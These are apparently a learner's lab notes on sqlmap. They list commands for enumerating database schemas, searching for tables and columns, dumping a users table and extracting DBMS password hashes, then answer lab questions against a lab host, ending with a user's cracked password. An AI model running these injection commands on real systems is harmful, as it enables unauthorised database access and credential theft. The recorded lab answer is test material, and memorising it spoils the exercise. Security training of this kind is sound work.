
### DB Schema Enumeration

```go
sqlmap -u "http://www.example.com/?id=1" --schema
```

### Searching for Data
```go
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

To search for column names based on specific keywords:
```go
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

### Password Enumeration and Cracking

Do this once you ID a table with passwords, execute with the `-T` option:
```go
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

### Dump system content credentials

```go
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

>[!tip] Dump Everything
> Using the `--all` and `--batch` switches 

# Questions

### What's the name of the column containing "style" in it's name? (Case #1)

```go
sqlmap -u "http://154.57.164.67:31688/case1.php?id=1" --search -C style
```

![[Pasted image 20260715172507.png]]

### What's the Kimberly user's password? (Case #1)

```go
sqlmap -u "http://154.57.164.67:31688/case1.php?id=1" --schema
```


![[Pasted image 20260715173023.png]]


```go
sqlmap -u "http://154.57.164.67:31688/case1.php?id=1" --dump -D testdb -T users
```

![[Pasted image 20260715173440.png]]

kimberly's password is:
```go
Enizoom1609
```